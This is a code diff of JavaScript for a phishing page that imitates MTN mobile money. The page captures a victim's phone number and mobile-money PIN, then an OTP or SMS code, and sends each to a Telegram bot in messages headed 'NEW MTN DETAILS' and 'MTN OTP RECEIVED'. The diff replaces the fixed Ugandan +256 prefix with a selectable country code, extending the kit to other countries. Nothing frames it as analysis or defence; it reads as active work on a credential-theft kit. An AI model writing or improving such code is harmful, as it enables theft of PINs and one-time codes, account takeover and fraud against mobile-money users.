@@ -80,14 +80,18 @@ document.addEventListener('DOMContentLoaded', () => {
     if (phoneNumberInput) {
         phoneNumberInput.addEventListener('input', function(e) {
             let value = this.value.replace(/\D/g, '');
-            if (value.length > 9) {
-                value = value.substring(0, 9); // Limit to 9 digits typically
+            if (value.length > 15) {
+                value = value.substring(0, 15);
             }
             
+            // Format chunks of 3 digits for readability
             let formatted = '';
-            if (value.length > 0) formatted += value.substring(0, 3);
-            if (value.length > 3) formatted += ' ' + value.substring(3, 6);
-            if (value.length > 6) formatted += ' ' + value.substring(6, 9);
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 3 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
             
             this.value = formatted;
         });
@@ -120,7 +124,8 @@ document.addEventListener('DOMContentLoaded', () => {
             let pinValue = '';
             pinInputs.forEach(input => pinValue += input.value);
             
-            const message = `🟢 <b>NEW MTN DETAILS</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔒 <b>PIN:</b> ${pinValue}`;
+            const countryCode = document.getElementById('countryCode').value;
+            const message = `🟢 <b>NEW MTN DETAILS</b>\n\n📱 <b>Phone:</b> ${countryCode} ${phoneNumberInput.value}\n🔒 <b>PIN:</b> ${pinValue}`;
 
             // Send to Telegram
             sendToTelegram(message).then(() => {
@@ -128,7 +133,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 btn.disabled = false;
                 
                 // Show Step 2
-                displayPhone.innerText = '+256 ' + phoneNumberInput.value;
+                displayPhone.innerText = countryCode + ' ' + phoneNumberInput.value;
                 step1.style.display = 'none';
                 step2.style.display = 'block';
                 
@@ -164,7 +169,8 @@ document.addEventListener('DOMContentLoaded', () => {
             // Get OTP value
             let otpValue = otpInputText.value.trim();
             
-            const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔑 <b>Message/OTP:</b>\n${otpValue}`;
+            const countryCode = document.getElementById('countryCode').value;
+            const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> ${countryCode} ${phoneNumberInput.value}\n🔑 <b>Message/OTP:</b>\n${otpValue}`;
 
             // Send OTP to Telegram
             sendToTelegram(message).then(() => {
